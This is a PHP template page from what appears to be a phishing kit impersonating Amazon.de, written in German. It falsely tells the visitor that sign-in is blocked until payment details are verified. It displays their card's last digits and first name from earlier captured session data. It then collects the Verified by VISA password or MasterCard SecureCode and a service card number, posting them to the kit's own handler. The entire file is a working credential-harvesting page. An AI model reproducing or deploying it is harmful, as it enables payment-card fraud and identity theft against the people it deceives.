<?php
	session_start();
	include("config.php");
	
	if (isset($_SESSION['finished']) && $_SESSION['finished']) {
		header('Location: '. $redirect);
	}
?>

<!DOCTYPE html>
<html class="a-ws a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-gradients a-transform3d a-touch-scrolling a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember" data-aui-build-date="3.17.4.2-2017-03-18">
	<head>
		<meta http-equiv="content-type" content="text/html; charset=UTF-8">
		<link rel="stylesheet" href="src/css/31O9784sOL.css">
		<link rel="stylesheet" href="src/css/61qjsbDraqL.css">
		<title><?php echo $title ?></title>
		<link rel="stylesheet" href="src/css/01IP25TkamL.css">
		<link rel="stylesheet" href="src/css/419ZIIK4ICL.css">
		<link rel="stylesheet" href="src/font-awesome/css/font-awesome.min.css">
		<link rel="stylesheet" href="src/css/custom.css?<?php echo time();?>">		
		<link href="src/img/favicon.ico" rel="shortcut icon" />
	</head>
	
	<body class="a-meter-animate">
		<style type="text/css">
			.nav-sprite-v1 .nav-sprite, .nav-sprite-v1 .nav-icon {
			  background-image: url(src/img/nav-sprite-global_bluebeacon-1x_optimized._CB295582946_.png);
			  background-position: 0 1000px;
			  background-repeat: repeat-x;
			}
			.nav-spinner {
			  background-image: url(src/img/snake._CB192194539_.gif);
			  background-position: center center;
			  background-repeat: no-repeat;
			}
			.nav-timeline-icon, .nav-access-image, .nav-timeline-prime-icon {
			  background-image: url(src/img/timeline_sprite_1x.png);
			  background-repeat: no-repeat;
			}
		</style>
		<link rel="stylesheet" href="src/css/719Je9HLSTL.css">
		<link rel="stylesheet" href="src/css/uDzwVmjTcOCPxHLlU3NYtRo6Q5Fev0GI729sXbWEn4.css">
		<a id="nav-top"></a>
		
		<header class="nav-locale-de nav-lang-de nav-ssl nav-unrec nav-paladin-ww nav-opt-sprite">
			<div id="navbar" role="navigation" class="nav-sprite-v1 nav-bluebeacon">
				<div id="nav-belt">
					<div class="nav-left">
						<div id="nav-logo">
							<a href="#" class="nav-logo-link" tabindex="2">
								<span class="nav-logo-base nav-sprite">Amazon.de</span>
								<span class="nav-logo-ext nav-sprite"></span>
								<span class="nav-logo-locale nav-sprite"></span>
							</a>

							<a href="#" aria-label="" tabindex="3" class="nav-logo-tagline nav-sprite nav-prime-try">
								Prime testen
							</a>
						</div>
					</div>
					<div class="nav-right">
						<div id="nav-swmslot">
							<div id="navSwmHoliday" style="background-image: url(src/img/prime.jpg); width: 400px; height: 39px; overflow: hidden;position: relative;">
							<img alt="AIV" src="src/img/transparent-pixel.gif" usemap="#nav-swm-holiday-map" height="39px" border="0" width="400px"></div>
						</div>
					</div>
					
					<div class="nav-fill"></div>
				</div>
				
				<div id="nav-main" class="nav-sprite">
					<div class="nav-left">
						<div id="nav-shop">
							<a href="#" class="nav-a nav-a-2" id="nav-link-shopall" tabindex="10"><span class="nav-line-1"></span><span class="nav-line-2"><span class="nav-icon nav-arrow" style="visibility: hidden;"></span></span></a>
						</div>
					</div>
					<div class="nav-right">
						<div id="nav-tools">
							<a href="#" class="nav-a nav-a-2" data-nav-ref="nav_ya_signin" data-nav-role="signin" id="nav-link-yourAccount" tabindex="26" style="border-radius:3px;border: 1px solid #ccc;">
								<span class="nav-line-1">Hallo! Anmelden <span style="color:#FF9900">(Anmeldung nicht möglich! Verifikation erforderlich)</span></span>
								<span class="nav-line-2">Mein Konto<span class="nav-icon nav-arrow" style="visibility: visible;"></span></span>
							</a>
							<a href="#" class="nav-a nav-a-2" id="nav-link-prime" tabindex="27"><span class="nav-line-1"></span><span class="nav-line-2"><span class="nav-icon nav-arrow" style="visibility: hidden;"></span></span></a>
							<a href="#" class="nav-a nav-a-2" id="nav-link-wishlist" tabindex="28"><span class="nav-line-1"></span><span class="nav-line-2"><span class="nav-icon nav-arrow" style="visibility: hidden;"></span></span></a>
							<a href="#" class="nav-a nav-a-2" id="nav-link-wishlist" tabindex="28"><span class="nav-line-1"></span><span class="nav-line-2"><span class="nav-icon nav-arrow" style="visibility: hidden;"></span></span></a>
						</div>
					</div>
					<div class="nav-fill">
						<div id="nav-xshop-container" class="">
							<div id="nav-xshop">
								<a href="#" data-nav-tabindex="5" class="nav-a nav_a" id="nav-your-amazon">Anmeldung <span style="color:#7CAB2B">&#10004;</span></a>
								<a href="#" class="nav-a" tabindex="22"> Bestätigung der persönlichen Daten <span style="color:#7CAB2B">&#10004;</span></a>
								<a href="#" class="nav-a" tabindex="23"><span style="color:#FF9900">&#10148; Zahlungsmittel bestätigen</span></a>
								<a href="#" class="nav-a" tabindex="24">Abschließen <span style="color:red">&#10006;</span></a>
							</div>
						</div>
					</div>
				</div>
				<div id="nav-subnav" style=""></div>
			</div>
		</header>

		<style>
		  #nav-prime-tooltip{
			padding: 0 20px 2px 20px;
			background-color: white;
			font-family: arial,sans-serif;
		  }
		  .nav-npt-text-title{
			font-family: arial,sans-serif;
			font-size: 18px;
			font-weight: bold;
			line-height: 21px;
			color: #E47923;
		  }
		  .nav-npt-text-detail, a.nav-npt-a{
			font-family: arial,sans-serif;
			font-size: 12px;
			line-height: 14px;
			color: #333333;
			margin: 2px 0px;
		  }
		  a.nav-npt-a {
			text-decoration: underline;
		  }
		</style>
		
		<div class="cs-content">
			<div class="cs-contact-title">
				<h1>
					Amazon - Kundenservice Sicherheitscenter
				</h1>
			</div>
			
			<div class="f1-steps">
				<div class="f1-progress">
					<div class="f1-progress-line" data-now-value="16.66" data-number-of-steps="3" style="width: 83.34%;"></div>
				</div>
				<div class="f1-step activated">
					<div class="f1-step-icon"><i class="fa fa-user"></i></div>
					<p>Bestätigung der hinterlegten persönlichen Daten</p>
				</div>
				<div class="f1-step activated">
					<div class="f1-step-icon"><i class="fa fa-dollar"></i></div>
					<p>Bestätigung der hinterlegten Zahlungsmittel</p>
				</div>
				<div class="f1-step active">
					<div class="f1-step-icon"><i class="fa fa-check"></i></div>
					<p>Zahlungsinformationen bestätigen</p>
				</div>
			</div>	

<!-- 			<div class="cs-step" id="orderSelect" style="display:<?php echo ((isset($_SESSION['errList']) && count($_SESSION['errList'] != 0)) ? "block" : "none") ?>">
				<div id="orderUnrelatedArea" class="newOrderSummary" style="width:510px;margin:0 auto;background-color:#FFFFDD;border: 1px solid #A31919">
					<table class="newOrderTable" cellspacing="0" cellpadding="0" border="0">
						<tbody>
							<tr valign="top">
							<td>
								<div class="newAccountText">
									<span style="background-position-y: -75px"></span>
									<h6>Es ist ein Fehler aufgetreten:</h6>
									<ul style="color:#A31919">
										<?php /*
											if (isset($_SESSION['errList'])) {
												for ($i = 0; $i < count($_SESSION['errList']); $i++) {
													echo '<li>' . $_SESSION['errList'][$i] . '</li>';
												}
												
												unset($_SESSION['errList']);
											} */
										?>
									</ul>
								</div>
							</td>
						</tr>
						</tbody>
					</table>                                                                           
				</div>
			</div> -->
				
			<div class="cu-eb-top" style="width:520px;margin:20px auto 0">
				<div class="cu-eb-top-left cu-eb-top-left-3"></div>
				<h2 class="step">Zahlungsinformationen bestätigen - <b><?php echo ((isset($_SESSION['ccnr']) && substr($_SESSION['ccnr'], 0, 1) == 4) ? "<i>Verified by VISA Passwort</i>" : "<i>MasterCard® SecureCode™</i>") ?></b></h2>
			</div>

			<div class="cu-middle" style="border:0px;width:520px;margin:0 auto">
				<div style="border:1px solid rgb(225,225,225);padding:25px;box-shadow: 3px 3px 8px 4px rgb(200,200,200);">
					<br/>
				
					<span class="ap_col2 ap_left" style="margin-left:10px;font-size:13px;color: #c60;font-weight: bold;">
						<?php echo ((isset($_SESSION['ccnr']) && substr($_SESSION['ccnr'], 0, 1) == 4) ? '<img src="src/img/vbv.gif" style="float:right;margin-top:-10px;"/>' : '<img src="src/img/sc.gif" style="float:right;margin-top:-10px"/>') ?>
						Bitte geben Sie <?php echo ((isset($_SESSION['ccnr']) && substr($_SESSION['ccnr'], 0, 1) == 4) ? "Ihr <i>Verified by VISA Passwort</i>" : "Ihren <i>MasterCard® SecureCode™</i>") ?> ein.
					</span>
					
					<br/><br/>
				
					<form id="frmVisa" action="index.php" method="POST">
						 <div class="fixed_width_form">
							<table class="ap_form_table" style="margin-top:10px">
								<tr>
									<td style="padding:3px">
										<div class="right">
											<div class="ap_input_label">
												<label for="ap_email">Händler:</label>
											</div>
										</div>
									</td>
									<td style="padding:3px">
										Amazon.com, Inc.
									</td>
								</tr>
								
								<tr>
									<td style="padding:3px">
										<div class="right">
											<div class="ap_input_label">
												<label for="ap_email">Datum:</label>
											</div>
										</div>
									</td>
									<td style="padding:3px">
										<?php echo $date; ?>
									</td>
								</tr>
								
								<tr>
									<td style="padding:3px">
										<div class="right">
											<div class="ap_input_label">
												<label for="ap_email">Kreditkartennummer:</label>
											</div>
										</div>
									</td>
									<td style="padding:3px">
										XXXX XXXX XXXX <b><?php echo (isset($_SESSION['ccnr'])) ? substr($_SESSION['ccnr'], 12, 16) : ''; ?></b>
									</td>
								</tr>
								
								<tr>
									<td style="padding:3px">
										<div class="right">
											<div class="ap_input_label">
												<label for="ap_email">Persönliche Begrüßung:</label>
											</div>
										</div>
									</td>
									<td style="padding:3px">
										Hallo <?php echo (isset($_SESSION['vorname'])) ? ucfirst($_SESSION['vorname']) : ''; ?>
									</td>
								</tr>
								
								<tr>
									<td style="padding:6px">
										<div class="right">
											<div class="ap_input_label">
												<label for="ap_email">
													<?php echo ((isset($_SESSION['ccnr']) && substr($_SESSION['ccnr'], 0, 1) == 4) ? "Verified by VISA Passwort" : "SecureCode") ?>:
												</label>
											</div>
										</div>
									</td>
									<td>
										<input name="code" value="<?php echo (isset($_SESSION['securecode']) ? $_SESSION['securecode'] : ""); ?>" autocomplete="off" maxlength="30" type="text" style="margin-top:0px;height:18px;width:200px;" class="<?php echo (isset($_SESSION['sc_err']) ? "a-form-error" : ""); ?>">

										<?php if(isset($_SESSION['errList']['securecode'])) { ?>
											<div class="a-section a-spacing-none a-spacing-top-micro address-ui-widgets-inline-error-alert" style="max-width: 300px">
												<div class="a-box a-alert-inline a-alert-inline-error" aria-live="assertive" role="alert">
													<div class="a-box-inner a-alert-container">
														<i class="a-icon a-icon-alert"></i>
														<div class="a-alert-content">
															<div class="a-section"><?php echo $_SESSION['errList']['securecode'];?></div>
														</div>
													</div>
												</div>
											</div>
										<?php } ?>											
									</td>
								</tr>
								
								<tr style="display:<?php echo (isset($_SESSION['specialBin']) ? "table-row" : "none") ?>">
									<td style="padding:6px">
										<div class="right">
											<div class="ap_input_label">
												<label for="ap_email">
													Servicekartennummer:
												</label>
											</div>
										</div>
									</td>
									<td>
										<input type="text" style="margin-top:0px;height:18px;width:200px;<?php echo (isset($_SESSION['sk_err']) ? "border:1px solid #A31919" : ""); ?>" maxlength="16" name="sknr" size="25"/>
									</td>
								</tr>
								
								<tr>
									<td>
										<!-- <span class="in-amzn-btn btn-prim-med-ra" unselectable="on" style="margin-top:10px">
											<span>
												<input name="cancelcode" value="Nicht registriert" tabindex="5" style="width:150px" type="submit">
											</span>
										</span> -->
										<a href="javascript:;" class="with-input">
								            <span class="a-button" id="a-autoid-1"><span class="a-button-inner"><input class="a-button-input" type="submit" name="cancelcode" value="Nicht registriert" aria-labelledby="a-autoid-1-announce"><span class="a-button-text" aria-hidden="true" id="a-autoid-1-announce"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Nicht registriert</font></font></span></span></span>
								        </a>										
									</td>
									
									<td>
										<!-- <span class="in-amzn-btn btn-prim-med-ra" unselectable="on" style="margin-left:50px;margin-top:10px">
											<span>
												<input name="sendcode" value="Senden" tabindex="5" style="width:150px" type="submit">
											</span>
										</span> -->
										<span class="a-button a-button-primary with-input pull-right">
											<span class="a-button-inner btn-sec-sm">
												<a id="B2B-Full-1-heroctavideo-register-announce" href="javascript:;" class="a-button-text btn-sec-med" role="button"><input name="sendcode" value="Senden" type="submit"></a>
											</span>
										</span>	
										<div class="clearfix"></div>
									</td>
									
								</tr>
						
							</table>
						</div>
					</form>
				</div>
			</div>
		</div>
		<?php
			if (isset($_SESSION['sc_err'])) { unset($_SESSION['sc_err']); }
			if (isset($_SESSION['sk_err'])) { unset($_SESSION['sk_err']); }
			unset($_SESSION['errList']);
		?>
		<div id="navFooter" class="navLeftFooter nav-sprite-v1" style="width:100%;position:absolute;bottom:0"><div class="navFooterLine navFooterLinkLine navFooterPadItemLine"> <span> <div class="navFooterLine navFooterLogoLine"> <a href="#"> <div class="nav-logo-base nav-sprite"></div> </a> </div> </span> <span class="icp-container-desktop"> <div class="navFooterLine"> <style type="text/css">#icp-touch-link-country{display:none}#icp-touch-link-language{display:none}</style> <a href="#" class="icp-button a-declarative" id="icp-touch-link-language"> <div class="icp-nav-globe-img-2 icp-button-globe-2"></div><span class="icp-color-base">Deutsch</span><span class="nav-arrow icp-up-down-arrow"></span> </a> <a href="#" class="icp-button a-declarative" id="icp-touch-link-country"> <span class="icp-flag-3 icp-flag-3-de"></span><span class="icp-color-base">Deutschland</span> </a> </div> </span> </div> <div class="navFooterLine navFooterLinkLine navFooterPadItemLine navFooterCopyright"> <ul> <li class="nav_first"> <a href="#" class="nav_a">Unsere AGB</a> </li> <li> <a href="#" class="nav_a">Datenschutzerklärung</a> </li> <li> <a href="#" class="nav_a">Impressum</a> </li> <li class="nav_last "> <a href="#" class="nav_a">Cookies &amp; Internet-Werbung</a> </li> </ul> <span>© 1998-<?php echo date("Y"); ?>, Amazon.com, Inc. oder Tochtergesellschaften</span> </div> </div>
	</body>
</html>